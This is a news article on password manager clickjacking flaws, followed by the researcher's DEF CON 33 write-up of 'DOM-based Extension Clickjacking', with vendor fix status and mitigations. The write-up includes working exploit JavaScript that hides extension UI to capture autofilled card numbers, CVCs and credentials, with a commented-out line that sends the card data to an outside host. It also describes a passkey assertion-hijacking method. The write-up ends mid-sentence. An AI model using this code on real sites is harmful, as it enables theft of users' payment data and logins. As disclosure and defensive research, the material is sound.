  "content": "Serving tech enthusiasts for over 25 years. TechSpot means tech analysis and advice you can trust\n\nFacepalm: Millions of users on several leading password manager platforms face heightened security risks due to unpatched clickjacking vulnerabilities, researchers warned at the recent DEF CON 33 hacker conference. If exploited, these flaws could allow attackers to steal sensitive data including login credentials, authentication codes, and financial information.\n\nAt the conference, security researcher Marek T\u00f3th revealed that browser extensions for six password managers \u2013 1Password, Bitwarden, Enpass, iCloud Passwords, LastPass, and LogMeOnce \u2013 are vulnerable to sophisticated clickjacking attacks. According to his findings, these flaws persist in the latest versions of the platforms tested as of August 19, 2025.\n\nClickjacking is a technique in which attackers overlay invisible buttons or forms on legitimate website content, tricking users into clicking hidden elements without realizing it.\n\nT\u00f3th's research extends traditional clickjacking techniques to target browser extensions \u2013 software that users increasingly rely on for managing credentials. The attacks involve tactics such as rendering parts of the password manager invisible, overlaying fake elements on top of legitimate ones, or tracking the user's mouse so that any click could expose sensitive information. Out of 11 popular password managers tested, every product showed at least one vulnerability to the reported attack technique. T\u00f3th privately notified all affected companies in April 2025, ahead of his planned public disclosure at DEF CON 33 in August. Cybersecurity firm Socket later verified the findings and is now working with vendors to assign Common Vulnerabilities and Exposures identifiers for each impacted product.\n\u2022 Apple issues emergency update to fix zero-day exploit in iPhone and macOS\n\u2022 Dropbox is shutting down its password manager next month \u2013 here are the best alternatives The affected platforms include 1Password (version 8.11.4.27), Bitwarden (version 2025.7.0, though a fix was released in 2025.8.0 after disclosure), Enpass (version 6.11.6, which had previously introduced a partial mitigation), iCloud Passwords (version 3.1.25), LastPass (version 4.146.3), and LogMeOnce (version 7.12.4). Collectively, these six vendors serve an estimated 40 million users. In contrast, some industry peers \u2013 such as Dashlane, NordPass, Proton Pass, RoboForm, and Keeper \u2013 responded quickly with patches or updates ahead of T\u00f3th's presentation. Users are strongly advised to verify that they are running the latest available versions to remain protected. Vendor responses to the discovery have varied. Bitwarden acknowledged the vulnerabilities and implemented a fix in version 2025.8.0, which is currently being deployed across browser extension stores. By contrast, 1Password and LastPass initially categorized the reported flaws as \"informative,\" suggesting they did not consider them in scope for immediate, incentivized remediation. LastPass later told Bleeping Computer that it is working to address the issues and emphasized existing safeguards, such as pop-up prompts before auto-filling sensitive data. LogMeOnce did not respond to repeated communication attempts. The attack works by manipulating web technologies to hide or make password manager UI elements transparent, using CSS properties like opacity or stacking elements with z-index. For example, an attacker might craft a fake interface \u2013 such as a cookie consent banner or CAPTCHA \u2013 that covers the genuine autofill button of a password manager. When the user interacts with what appears to be a benign element, their input is redirected to the password manager, triggering silent autofill and exposing confidential information. T\u00f3th's research also demonstrated that a universal attack script could identify which password manager is active in a user's browser and dynamically adapt its approach. The researcher published live proof-of-concept demos showing successful exploitation against multiple platforms, including scenarios where login credentials and credit card details were exfiltrated. Despite the critical nature of these findings, many password manager vendors maintain that clickjacking is a generalized web security risk that is traditionally mitigated by browser security models and user vigilance, rather than by password manager software alone. Some companies have even listed this vulnerability type as \"out-of-scope\" in their bug bounty programs, citing prior research and existing industry mitigations. Until comprehensive fixes are rolled out and verified by vendors, security researchers recommend that users disable autofill functions within password manager extensions and, where possible, use copy-paste workflows for handling credentials. Enhanced user vigilance and cautious interaction with suspicious web overlays or pop-ups are also advised.",

      "text": "DOM-based Extension Clickjacking: Your Password Manager Data at Risk\n9 August 2025 (Updated: 20 August 2025)\nThis security research was presented at DEF CON 33: PDF presentation\nIs clickjacking still an exploitable vulnerability nowadays? Many bug bounty programs have this vulnerability listed in the \"out of scope\" section, and in better cases they accept it but don't reward it. The reason is that there are many protections available today that significantly reduce the impact of this vulnerability. It can be said that a common web clickjacking vulnerability has already been solved and can be easily defended against.\nThe result of my research is that clickjacking is still a security threat, but it's necessary to shift from web applications to browser extensions, which are more popular nowadays (password managers, crypto wallets and others).\nI described a new attack technique with multiple attack variants and tested it against 11 password managers. This resulted in discovering several 0-day vulnerabilities that could affect stored data of tens of millions of users.\nA single click anywhere on a attacker controlled website could allow attackers to steal users' data (credit card details, personal data, login credentials including TOTP). The new technique is general and can be applied to other types of extensions.\nTable of contents:\n- Key Information\n- Introduction\n- Browser Extension Clickjacking\n- IFRAME-based\n- DOM-based Extension Clickjacking\n- Extension Element\n- Parent Element\n- Overlay\n- Position\n- Password Managers: Test Results\n- Detection\n- Impact\n- Password Managers: Vulnerable & Fixed Versions\n- Demo Sites\n- Users at Risk\n- Limitation\n- Mitigation\n- Recommendations for Users\n- Conclusion\nKey Information\n\u2022 A new clickjacking technique where a malicious script manipulates UI elements that browser extensions inject into the DOM by making them invisible using javascript.\n\u2022 In my research, I selected 11 password managers that are used as browser extensions and the result was that all were vulnerable to \"DOM-based Extension Clickjacking\". Tens of millions of users could be at risk (~40 million active installations).\n\u2022 A single click anywhere on the attacker's website could leak credit card details including security codes (6 out of 9 were vulnerable) or exfiltrate stored personal information (8 out of 10 vulnerable).\n\u2022 All password managers filled credentials not only to the \"main\" domain, but also to all subdomains. An attacker could easily find XSS or other vulnerabilities and steal the user's stored credentials with a single click (10 out of 11), including TOTP (9 out of 11). In some scenarios, passkey authentication could also be exploited (8 out of 11).\n\u2022 All vulnerabilities were reported in April 2025 with a notice that public disclosure will be in August 2025. Some vendors have still not fixed described vulnerability: Bitwarden, 1Password, iCloud Passwords, Enpass, LastPass, LogMeOnce. Users of these password managers may still be at risk (~32.7 million active installations).\n\u2022 For Chromium-based browser users it is recommended to configure site access to \"on click\" in extension settings. This configuration allows users to manually control autofill functionality.\n\u2022 The described technique is general and I only tested it on 11 password managers. Other DOM-manipulating extensions are probably vulnerable (password managers, crypto wallets, notes etc.).\nIntroduction\nIntrusive Web Elements\nWhile browsing websites, users often encounter intrusive web elements that block immediate access to target content. These elements require users to click to close them.\nThe most common intrusive elements requiring user action:\n- Cookie consent banners - 1 click (accept/decline cookies)\n- Newsletter popup, login dialog - 1 click (closing dialog)\n- Web push notifications - 1 click (accept/decline)\n- Cloudflare challenge pages / Captcha pages - 1 click (Verify you are human)\n2 clicks if verification fails, 4 or more clicks if captcha needs to be solved\n1-3 clicks from the user are commonly required before accessing content.\nBecause users expect to interact with these elements, I will use fake intrusive web elements in a clickjacking exploit to trick the user into clicking.\nClickjacking (Web Application)\nClickjacking (or \"UI redressing\") is a client-side attack technique that exploits visual layering to hijack user clicks intended for legitimate interface elements. This attack uses invisible frames (iframes) to deceive users who believe they are clicking on legitimate website elements, while actually performing actions that benefit the attacker.\nBasic attack principle:\n- Attacker creates a malicious page with an invisible iframe containing the target website (opacity:0).\n- User visits the malicious page and clicks on apparently legitimate visible elements.\n- Clicks are actually intercepted by the hidden iframe, performing unwanted actions on the target site.\n<iframe src=\"https://targetsite.com\" style=\"opacity:0\"></iframe>\nTo mitigate security impact, security headers X-Frame-Options or Content-Security-Policy are used.\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nX-Frame-Options: ALLOW-FROM https://example.com\nContent-Security-Policy: frame-ancestors 'none';\nContent-Security-Policy: frame-ancestors 'self';\nContent-Security-Policy: frame-ancestors https://example.com\nAdditionally, the SameSite Lax or Strict cookie attribute can be set to prevent cookie usage in cross-site iframes.\nSameSite=Lax cookies in cross-site POST request or cross-site iframes are blocked\nSameSite=Strict cookies only for same-site requests\nSameSite=None allowed cookies for cross-site requests\nDefault value is SameSite=Lax if SameSite isn't specified.\nClickjacking in web applications has minimal security impact in most cases because users are not authenticated in the loaded iframe and therefore preventing any malicious actions from being executed.Password Managers\nPassword managers are widely used as browser extensions to simplify website authentication. In this research, I tested 11 password managers using a new technique.\nFor reference, the article The Best Password Managers for 2025 by PCMag was used for the selection of 10 password managers.\nThe following password managers were listed there:\n- 1Password\n- Bitwarden\n- Dashlane\n- Enpass\n- Keeper\n- LastPass\n- LogMeOnce\n- NordPass\n- ProtonPass\n- RoboForm\nI also added iCloud Passwords to this list because it is widely used (5.4 million active installations - Chrome Web Store, Firefox Add-ons, Edge Add-on).\nI want to mention that iCloud Passwords was tested only as a browser extension (Google Chrome, Firefox, etc.) and not as a system application with Safari integration.\nAutofill featurePassword managers have autofill functionality that can be of 2 types:\n- Automatic autofill - credentials are automatically filled in (0-click)\n- Manual autofill - user interaction is required to fill in credentials (selecting from a dropdown menu)\nMy research focuses on clickjacking, so click is required and I was focus only on manual autofill.\nOn automatic autofill I published research in 2021 (blog).\nBrowser Extension Clickjacking\nClickjacking vulnerability in browser extensions works similarly to web applications. Through clicking, the user unknowingly performs an action that causes their browser extension to execute malicious activity such as data exfiltration, functionality deactivation, stored note deletion and others.\nBrowser extension clickjacking can currently be categorized into 2 types:\n- IFRAME-based - publicly described type (web_accessible_resources)\n- DOM-based - new described type\nI will first describe the IFRAME-based variant, which was not the research focus but may be unknown to many people.\nIFRAME-based\nA publicly documented clickjacking technique for browser extensions exploits misconfigured web_accessible_resources in the manifest.json file.\nmanifest.json is the main configuration file of a browser extension. It contains basic information such as the extension\u2019s name, version, and description, as well as settings that define what scripts, icons, and permissions the extension uses. Without this file, the browser cannot recognize or run the extension.\nChromium-based path:\nchrome-extension://<extension_ID>/manifest.jsonMozilla Firefox path:\nmoz-extension://<extension_ID>/manifest.jsonLocal device path:\n%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Extensions\\<extension_ID>\\<version>\\manifest.json\nIn the web_accessible_resources part, developers explicitly define files (HTML, scripts, styles, images) that should be accessible from web pages outside the extension interface itself. If developers don't specify sufficient restrictions, attackers can abuse these resources.\nUsage\nWhen files with significant functionality (HTML files) are defined in web_accessible_resources, an attacker can create a page that loads this file into a transparent iframe and tricks users into unknowingly clicking on extension elements.\nThis uses basically the same principle as web application clickjacking.\nBasic usage:\n<iframe src=\"chrome-extension://<extension_ID>/file.html\" style=\"opacity:0\"></iframe>\nExample\nAlthough this isn't a new technique and information has been available for several years, some extensions still have this security vulnerability. In this research focused on password managers, one of them had this issue.\nIn December 2023, I reported this clickjacking vulnerability in the NordPass password manager. Due to incorrect web_accessible_resources definition, it was possible to load the entire password manager UI in an iframe.\nWith 4 clicks, it was possible to share all items from the password manager to an attacker's account. The result was that the attacker gained access to all stored passwords, credit cards, and personal data without the user's knowledge.\nVictim's view (opacity:0)\nSemi-transparent (opacity:0.5)\nBecause the victim was required to perform several clicks (select all, share items...), a fake Cloudflare captcha page was created as proof-of-concept. By completing the captcha, the attacker gets all data from the password manager.\nA major problem here was also that the victim received no notification about the shared files.\nI was awarded a $10,000 bounty for this vulnerability.\nTip: How did I know that the user clicked into the iframe so I could change the position?\nI used an off-viewport element that has onblur=\"iframeClick()\". If a user clicks into the iframe => the element lost focus and iframeClick() was executed, which changed the position and set focus again for that element.\nIn the past, the MetaMask cryptocurrency wallet, for example, had the same vulnerability (source, source2).\nManifest\nWith Manifest V3, resource access is now explicitly controlled through the matches parameter, requiring developers to define the exact origins from which resources may be loaded.\n\"web_accessible_resources\": [\n{\n\"resources\": [\"image.png\", \"script.js\"],\n\"matches\": [\"https://example.com/*\"]\n}\n]\nIn Manifest V2, there was no restriction to specific sources, making it always possible to load files from any domain.\n\"web_accessible_resources\": [\n{\n\"resources\": [\"image.png\", \"script.js\"]\n}\n]\nProtection\nOnly necessary files should be defined in the web_accessible_resources.\nWhen exposing HTML or script files that enable extension interaction, such as state modification, background script communication, or sensitive operations restrict access using the matches parameter to limit loading to specific trusted domains.\nAdditional protection requires implementing X-Frame-Options: DENY headers or Content-Security-Policy: frame-ancestors 'none'. These headers must be applied to all HTML responses served through web_accessible_resources.\nDOM-based Extension Clickjacking\nA new clickjacking technique where a malicious script manipulates UI elements that browser extensions inject into the DOM.\nThe principle is that a browser extension injects elements into the DOM, which an attacker can then make invisible using javascript.\nTo change visibility is used opacity:0 to various elements or overlay UI components.\nIn my case, focusing on password managers, the manual autofill feature was used to increase impact.\nPassword Manager Exploit Steps:\n- Create an intrusive element (cookie consent, cloudflare captcha etc.)\n- Create a form (login, personal data... )\n- Set transparency for the form (opacity: 0.001)\n- Use focus() for the form input \u2192 the autofill dropdown menu will appear\n- Make the UI invisible with DOM-based Extension Clickjacking\n- Victim accepts/rejects cookies = clicks on the invisible UI\n\u2192 data will be filled into the newly created form (2.)\n\u2192 attacker gets data from the form values\nTypes & Subtypes:\nDOM-based Extension Clickjacking can be divided into several types/categories. Each manipulates DOM elements differently, but the result is always the same - the UI is invisible but clickable.\nDOM-based Extension Clickjacking\n\u251c\u2500\u2500 Extension Element\n\u2502 \u251c\u2500\u2500 Root Element\n\u2502 \u2514\u2500\u2500 Child Element\n\u251c\u2500\u2500 Parent Element\n\u2502 \u251c\u2500\u2500 BODY\n\u2502 \u2514\u2500\u2500 HTML\n\u2514\u2500\u2500 Overlay\n\u251c\u2500\u2500 Partial Overlay\n\u2514\u2500\u2500 Full Overlay\nExtension Element\nThis is the most basic type, discovered in November 2023, which initiated this entire research. I initially reported only this variant. Later, in early 2025, I identified two additional types and documented the complete DOM-based technique.\nIn this type, the\nRoot Element\nThe user sets opacity directly on the extension's root element.\ndocument.querySelector(\"root-element\").style.opacity = 0;\nFor example, Proton Pass was vulnerable to this type of attack. To change visibility, the following code was used:\ndocument.querySelector(\"protonpass-root\").style.opacity = 0.5;\nChild Element\nThe user sets opacity on the extension's child elements. This usually occurred when a Shadow Root (open) was used, making the element accessible.\ndocument.querySelector(\"child-element\").style.opacity = 0;\nProton Pass remained vulnerable after the \"Root Element\" fix since child elements were still modifiable. Attackers had to just identify the root element name (changing per page refresh) before modifying child element opacity.\n// find root element\nconst x = Array.from(document.querySelectorAll('*'))\n.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'));\nx.shadowRoot.querySelector(\"iframe\").style.cssText += \"opacity: 0 !important;\";\nParent Element\nIn this type, the user sets\nBODY\nThe user sets opacity:0 for <body> element, which makes the extension UI transparent.\nAfter this setting, the <body> will be invisible, so the user sets a background-image on the <html> element.\nThe background image used is a screenshot of the website (can be used image or svg).\ndocument.body.style.opacity = 0;\ndocument.documentElement.style.backgroundImage = url(\"website.png\");\nExploit code: Parent Element - BODY\n// CREDIT CARD FORM\nvar cardform = document.getElementById('cardform');\nif (!cardform) {\ncardform = document.createElement('cardform');\ncardform.id = 'cardform';\ncardform.style = \"position: fixed; bottom: 0px; left:0px; z-index: 2147483647; opacity:0.1\";\ncardform.innerHTML = `<form method=\"post\" name=\"card\" onchange=\"getCardValues()\" action=\"/\" id=\"creditcard\" autocomplete=\"off\" novalidate=\"\" style=\"opacity:0.1\">\n<input type=\"text\" id=\"cardnumber\" name=\"cardnumber\" placeholder=\"\" autocomplete=\"cc-number new-password\" maxlength=\"19\" inputmode=\"numeric\" pattern=\"\\d*\" style=\"cursor:pointer\">\n<input type=\"text\" id=\"expiry\" placeholder=\"\" autocomplete=\"off\" inputmode=\"numeric\" pattern=\"\\d*\" autofocus>\n<input type=\"text\" name=\"cvc\" id=\"cvc\" placeholder=\"\" autocomplete=\"cc-csc new-password\" maxlength=\"3\" inputmode=\"numeric\" pattern=\"\\d*\">\n</form>`;\ndocument.body.appendChild(cardform);\n}\n// SET BACKGROUND-IMAGE\nwindow.setTimeout(function(){\ndocument.querySelector(\"html\").style.backgroundImage = \"url(website.png)\";\ndocument.getElementById('cardform').style = \"position: fixed;top: 453px;left: 467px;z-index: 2147483647;\";\ndocument.getElementById('cardnumber').focus();\ndocument.querySelector(\"body\").style.opacity = \"0.001\";\n}, 1000);\n// GET DATA FROM INPUTS\nfunction getCardValues() {\nvar cardnumber = document.getElementById('cardnumber').value;\nvar expiry = document.getElementById('expiry').value;\nvar cvc = document.getElementById('cvc').value;\nif (expiry && cvc) {\n// DATA WILL BE IN CONSOLE\nconsole.log(\"cardnumber=\"+cardnumber+\"&expiry=\"+expiry+\"&cvc=\"+cvc);\n/* Sending data to external server\nvar xhttp = new XMLHttpRequest();\nxhttp.open(\"GET\", \"https://example.com/?cardnumber=\"+cardnumber+\"&expiry=\"+expiry+\"&cvc=\"+cvc, true);\nxhttp.send();\n*/\n// AFTER STEALING DATA - OPACITY:1 FOR BODY\ncardform.style.display = \"none\";\ndocument.querySelector(\"body\").style.opacity = \"1\";\ndocument.querySelector(\"html\").style.backgroundImage = \"\";\n}\n}\nHTML\nThe user sets opacity:0 for <html> element, which makes everything transparent.\nVictim must click on blank page, that less practical but still exploitable.\nMust to be created \"clicking\" game - Reaction Time or Visual Memory Test. For example, the user might have to click on a white screen to test how fast their reactions are.\ndocument.documentElement.style.opacity = 0;\nOverlay\nIn this type, the user does not change the opacity but overlays the UI.\nPartial Overlay\nThe user creates elements around the extension UI with only a few pixels remaining visible (small clickable area).\nThe goal is that injected elements must be last in the DOM with maximum z-index value. Extension elements in many cases also have the maximum z-index value - the last element in the DOM will be 'on top'.\nOr using Popover API for these elements (=top layer element).

This allows an attacker to use one universal script against all the described password managers.\nLock/Unlock Detection\nBy analyzing DOM element attributes, attackers can determine whether a password manager is currently locked or unlocked.\nAn attacker therefore doesn't need to display \"cookies\" elements to obtain clicks, since they know the attack wouldn't be successful. Alternatively, they can use various social engineering techniques to cause the password manager to be unlocked.\nImpact\nBecause the exploit script uses manual autofill functionality, the impact is categorized by the type of data that are filled in.\nAttacker\u2019s website\nAn attacker can use their own website with javascript exploit and can exfiltrate these data:\nPersonal Data- name, email, phone, address, date of birth (some password managers)\n\u26a0\ufe0f This data is not domain-specific = can be autofilled on any website \u26a0\ufe0f\n*Keeper was not exploitable for these data on attacker's website\n1 click on an attacker's website\n\u2192 the attacker has your stored credit card details or your personal information.\n2 clicks and the attacker has both data (credit card details + personal data)\nIn the following video, the user uses RoboForm and the attacker forces the user to make 2 clicks \u2192 the attacker exfiltrates the user's credit card details and personal data\nSame example but with opacity:0.5 - RoboForm UI more visible\nProtonPass is marked as \"Not supported\" because it doesn't have autofill for credit cards, only copy/paste can be used. However, autofill functionality was planned (roadmap for spring 2025).\n1Password is marked as \"not vulnerable\" (\u2705) for Credit Card because user has to click on \"OK\" in dialog. But there was a problem with the dialog text \u26a0\ufe0f.\nOnly when filling credit card details was a generic consent dialog displayed for filling a \"1Password item\". After confirmation, the credit card was filled in. This dialog only appeared for credit cards, and users could be confused about what data was actually being filled.\nThe following video exploits this generic text:\n- First, the attacker exfiltrates personal data (including the email address).\n- Next, an email input is shown for entering an email address to receive a discount coupon.\n- The user is shown a generic consent dialog to fill in a \"1Password item\" (the user does not realize this is the credit card).\n- After confirmation, the attacker steals the credit card details and fills the input field with the user's email address exfiltrated in 1). \u2192 Credit card autofill wasn't vulnerable to clickjacking, but could still be exploited due to generic dialog text.\n1Password: Personal Data + Credit Card, generic text in alert (opacity:0)\n1Password: Personal Data + Credit Card, generic text in alert (opacity:0.5)\nWebsite with vulnerability (e.g. XSS)\nIn this case, the attacker needs to find some vulnerability, such as XSS, subdomain takeover, web cache poisoning or other. The goal is for the attacker to be able to execute their javascript code on a trusted domain. For simplicity, I will use \"XSS\" beacuse it's the most common type of vulnerability in web applications.\nThe attacker can exfiltrate these data:\nPassword managers allow not only storing credentials, but also storing TOTP (Time-based one-time password). If a user saves TOTP in the password manager instead of in another application (Google Authenticator), the attacker could also exfiltrate TOTP, often without additional user interaction.\nDomain autofill\nThe attacker can only steal credentials for the vulnerable domain.\nBut on the other hand, there is a huge advantage for the attackers. \u26a0\ufe0f All password managers fill credentials not only into the same domain where the credentials were stored, but also into all subdomains or parent domain in default configuration \u26a0\ufe0f.\n| Credentials Saved | Autofilled (manual autofill) |\n|---|---|\n| example.com | |\n| example.com | |\n| example.com |\nSubdomain autofill in Keeper. Other password managers have same behaviour \u26a0\ufe0f.\nIf a user has stored credentials for Google account, they will have them saved for: accounts.google.com\nThe attacker only needs to find XSS, for example, on test.dev.sandbox.cloud.google.com and still he can use \"DOM-based Extension Clickjacking\" technique and steal user's credentials for Google account.\nSo the attacker isn't limited to a small scope, he can find vulnerabilities anywhere on: *.example.com/*\n*automatic autofill enabled by default (0-click autofill)\nPoC Video:\nIn the following video, the attacker found an XSS vulnerability on a trusted domain (issuetracker.google.com) and shared a link on a social network:\n\u2192 the victim makes 3 clicks on fake intrusive elements\n\u2192 the attacker stole data: login credentials + TOTP (stored for accounts.google.com), credit card details, personal data\nBesides login credentials, another impact can be:\n\u2192 attacker creates a new session for victim account\nPasskeys are very strictly domain-limited and it's not possible to find a vulnerability on a subdomain in this case. The only exception would be if CORS requests to the passkeys auth server were allowed for the subdomain.\nIn some cases, it was possible to exploit passkey authentication using \"DOM-based Extension Clickjacking\". One method of exploitation was \"Signed Assertion Hijacking\".\nWhen creating a challenge, it is recommended that a session is also created on the server = session-bound challenge (source1, source2).\nThis is how the basic passkeys login flow looks like:\nIf the server doesn't create a session along with the challenge, it's possible to exploit the entire authentication flow. This results in \"signed assertion hijacking,\" where the attacker steals the signed assertion request and because nothing is required (no session), the attacker can use it to complete the login.\nHow does the attacker get this request? This can be done either by using XSS to intercept HTTP communication and forwarding the request to attacker server. Or by using XSS to modification the same passkey script but change the endpoint for the signed assertion. Again, they would send this request to their own server. This request is always one-time use, so XSS must be used to prevent the victim from sending it to the auth server.\nHow common is it for servers not to implement session-bound challenges? I looked at the FIDO Certified Showcase (\"The FIDO Company Showcase highlights FIDO Alliance members and their FIDO Certified solutions.\") and tested all passkey solutions (Category\u2192Passkeys). After filtering, I got 17 results. Not all solutions had a demo or SDK - I found 7.\nThe result was that 4 out of 7 did not implement \"session-bound challenge\", making this attack exploitable.\n\u2620\ufe0f Hanko - https://www.hanko.io (demo: https://www.passkeys.io)\n\u2620\ufe0f SK Telecom - https://www.sktelecom.com (demo: https://portal.passkey-sktelecom.com)\n\u2620\ufe0f NokNok - https://noknok.com (demo: https://bankauth.noknokdemo.com)\n\u2620\ufe0f Authsignal - https://www.authsignal.com (demo: https://demo.authsignal.com)\nOne example is the Hanko solution, used for the PoC demonstration (Hanko.io has 8,300 stars on GitHub).\nThe screenshot shows that the \"signed assertion\" request doesn't contain session data.\nUpon intercepting this request, an attacker can replay it to receive a \"200 OK\" response with a newly session (auth token).\nHow does the entire attack work?\n- The attacker finds XSS on a server where passkeys are used\n- Copies the entire passkey script and changes the \"signed assertion\" endpoint to their own server\n- Executes the passkey script via XSS and uses \"DOM-based Extension Clickjacking\" technique to hide the passkey dialog\n- The victim visits the URL with XSS vulnerability and clicks once (accept cookies = confirming the login via passkeys)\n- The attacker obtains the signed challenge (signed assertion), which is sent to their server\n- The attacker sends the signed assertion from their server to the auth server\n\u2192 because no session was required and the request contained a valid signed challenge, the entire request was valid and the attacker is logged in (newly created session)\nIn the following video, the victim uses ProtonPass and then makes a single click (accept cookies). The attacker gets \"signed assertion\" request and was able to send it to the server.\nBesides FIDO solutions, I found some others as well. I tested primarily on their demo solutions and again there was no \"session-bound challenge\" implementation.\nOther solutions without \"session-bound challenge\" implementation:\nPassage - https://passage.1password.com (demo: https://passage.1password.com/demo)\nCorbado - https://www.corbado.com (demo: https://passkeys.eu)\nDescope - https://www.descope.com (demo: https://www.passkeys.guru)\nIn many cases, passkey solutions do not verify users when adding additional devices \u26a0\ufe0f = the attacker is able to add their own device and thereby gain \"Persistent Access\".\n\u2192 he will always be able to log into the account using the added passkey (until the victim removes it)\nThe result is that if there were no clickjacking vulnerability in the password manager, this method would not be easily exploitable = the user would see a passkey dialog that they would have to confirm.\n1 click from the victim - the attacker has access to victim's account even when passkeys are used for authentication\n*automatic autofill enabled by default (0-click autofill)\nData Impact Summary\nCredit Card - credit card number, expiration date, security code\nPersonal Data - name, email, phone, address, date of birth (some password managers)\nLogin credentials - username, password, TOTP (2FA)\nPasskeys - signed assertion hijacking (authentication flow hijacking) = creating a new session\nPassword Managers: Vulnerable & Fixed Versions\n*automatic autofill enabled by default (0-click autofill)\nFixed means that only the described methods from this research are patched \u26a0\ufe0f. If other methods exist or there is some bypass, then the extensions are still vulnerable (but I don't know of any at the moment).\nFix Status 19.8.2025\nBelow is an overview of the fixed versions. If some method is missing, it only means that I can't trace back in which specific version it was.\n1Password\nVulnerable version: 8.11.4.27 (latest)\nVulnerable methods: Parent Element, Overlay\nIn addition to the clickjacking vulnerability, 1Password has confusing texting in the dialog box when filling in a credit card. There is generic text \"item\". The user may not know that it is a credit card.\nPoC with Credit Card:\nSee more in Credit Card section\nBitwarden\nVulnerable version: 2025.7.0 (latest)\nVulnerable methods: Parent Element\nDo you think that stealing a payment card or personal data with a single click is a high severity issue?\nBitwarden sees this vulnerability slightly differently. Maybe it could be reason why it was not fixed even after more than 4 months.\nDashlane\nFixed: v6.2531.1 (1.8.2025)\nSecurity Overview: https://support.dashlane.com/hc/en-us/articles/28598967624722-Advisory-Passkey-Dialog-Clickjacking-Issue\nEnpass\nVulnerable version: 6.11.6 (latest)\nVulnerable methods: Parent Element, Overlay\nFixed Method: Extension Element <6.11.4.2 (19.5.2025)\nRelease Notes: https://www.enpass.io/release-notes/enpass-browser-extensions/\niCloud Passwords\nVulnerable version: 3.1.25 (latest)\nMethods: Overlay\nFixed Method: Extension Element <2.3.22 (12.8.2024)\nAcknowledgements: August 2024 https://support.apple.com/en-us/122162\nKeeper\nFixed Methods:\nExtension Element <17.1.1 (1.5.2025)\nOverlay <17.2.0 (29.7.2025)\nLastPass\nVulnerable version: 4.146.1 (latest)\nVulnerable methods: Extension Element, Parent Element, Overlay\nFixed: Credit Card, Personal Data <=4.125.0 (15.12.2023)\nLogMeOnce\nVulnerable version: 7.12.4 (latest)\nVulnerable methods: Extension Element, Parent Element, Overlay\nNordPass\nFixed: <5.13.24 (15.2.2024)\nProtonPass\nFixed Methods:\nExtension Element, Parent Element <1.9.5 (22.12.2023)\nExtension Element <=1.31.0 (CRX)\nOverlay <=1.31.4\nAcknowledgements: https://proton.me/blog/protonmail-security-contributors\nFixed Methods:\nExtension Element <9.5.6 (7.12.2023)\nParent Element, Overlay <9.7.6 (25.7.2024)\nRelease Notes: https://www.roboform.com/news-ext-chrome\nDemo Sites\nYou can try vulnerable password managers on demo sites. It is prepared for 1Password and Bitwarden.\nDemo sites: https://websecurity.dev/password-managers/dom-based-extension-clickjacking/\nTo test stored credentials, you need to save them for the domain. You can do this here: https://websecurity.dev/password-managers/dom-based-extension-clickjacking/loginform/\nYou don't need to click on the exact location to fill in the data - clicking anywhere on the page is sufficient.\nThis is a basic proof-of-concept. A real attacker would overlay the same page for display purposes and would have pre-prepared website screenshots for different screen resolutions.\nNo data is sent anywhere, all data is only displayed on the page. But it's definitely better not to enter real credentials there.\nDemo sites: Full Overlay (Personal Data)\n- Personal data will be in console\nopacity:0.5: https://websecurity.dev/overlay/index2.html\nopacity:0: https://websecurity.dev/overlay/\nDemo sites: Full Overlay (Login Form)\n- login credentials will be in console\nopacity:0.5: https://websecurity.dev/overlay/login-opacity.html\nopacity:0: https://websecurity.dev/overlay/login.html\nUsers at Risk\nHow many users could have been affected by this vulnerability? Giving a specific number can be problematic. Not every user necessarily uses browser extensions, but only mobile applications.\nTherefore, I decided to count data from Chrome Web Store, Edge Add-ons, and Firefox Add-ons, which should provide information about active installations.\nThe vulnerabilities affected not only Chromium-based browsers but also extensions for other browsers. Due to the wider adoption of Chromium-based browsers, I demonstrated all the videos using them.\nThe values are always calculated at the time of reporting, or if the vulnerability is not fixed, the data are from the past few weeks.\nThe result is that tens of millions of users could be at risk (~40 million active installations).\nLimitation\nThe most significant limitation is the auto-lock/auto-logout functionality based on inactivity time.\nBy default, it is enabled with a very short time in 1Password (10 min) or Enpass (1 min). Some others also have this restriction, but with an inactivity time longer than 1 day, so the limitation is not as critical for them.\nFor example, iCloud Passwords uses the auto-lock functionality, but it has absolutely no effect on autofill. The clickjacking technique works even if iCloud Passwords is locked or if Lockdown Mode is enabled.\nAnother limitation is the auto-lock/auto-logout functionality based on browser restart. In general, it is necessary to have the password manager unlocked for successful attack.\nAnother limitation, or rather obstacle that the attacker must account for, is the different screen resolutions on the user side. If the attacker uses a background-image with a screenshot of a web page, it must display correctly. Therefore, they must first determine the resolution using javascript and then use the appropriate image resolution.\nOf course, a successful attack requires at least one user click. But with the use of various \"click\" elements, I don't think this is a significant limitation. How many times a day do you click on a cookie or login dialog?\nTo steal credentials, the user also needs to have stored data for the domain. However, if we are talking about an attack on well-known services, users will most likely have those credentials saved.\nMitigation\nBrowser extension developers should focus on the following parts. The missing fix of one method leads to the extension remaining vulnerable.\nExtension Element\n\u2022 styles cannot be changed (MutationObserver)\n\u2022 using \"Closed Shadow-Root\"\nParent Element\n\u2022 BODY/HTML opacity detection\n\u2022 using Popover API for extension should protect this method\nExtension Overlay\n\u2022 last DOM element detection (z-index conflict)\n\u2022 popover elements listing - when the autofill menu is opened, check if any other \"top layer\" elements exist\n\u2192 if another element exists the autofill menu should close\n\u2192 or just don't show extension UI if exist \"popover\" element\n\u2022 elementsFromPoint() can be used for partial overlay but cannot be used for popover elements (pointer-events:none are ignored)\n\u2192 The content script can temporarily remove pointer-events:none from all popover elements before filling in data, then check the \"top layer\" state using elementsFromPoint() and fill the data accordingly.\nDoesn't exist simple protection.\u26a0\ufe0f\nSome platform-level support should be created - new browser API protection for this clickjacking technique.\u26a0\ufe0f\nThe proposed solutions are still handled through javascript and conflicts may occur between exploit code and extension content script (extension white-box analysis can be made). The safest solution is to display a new popup window - but that will be very inconvenient for users.\nRecommendations for Users\nCheck that you have automatic updates enabled and that you are using the latest versions. Especially in companies, versions may be dependent on administrators, who should definitely keep everything updated.\nRegarding the recommendations, it's a somewhat complicated situation. Not every solution will suit every user.\nDisable manual autofill - copy/paste only\n- Many password managers allow disabling this function. But it can be inconvenient for someone. Especially when filling in personal information.\nSet only exact URL match for autofill credentials\n- This can easily mitigate the impacts for subdomains but an attacker can still find a vulnerability on exactly the same domain. Still can be exploitable credit card/personal data.\nSuch a \"hybrid\" solution can be in manually control autofill functionality. Below are instructions for Chromium-based browsers only, I was unable to find this setting for Mozilla 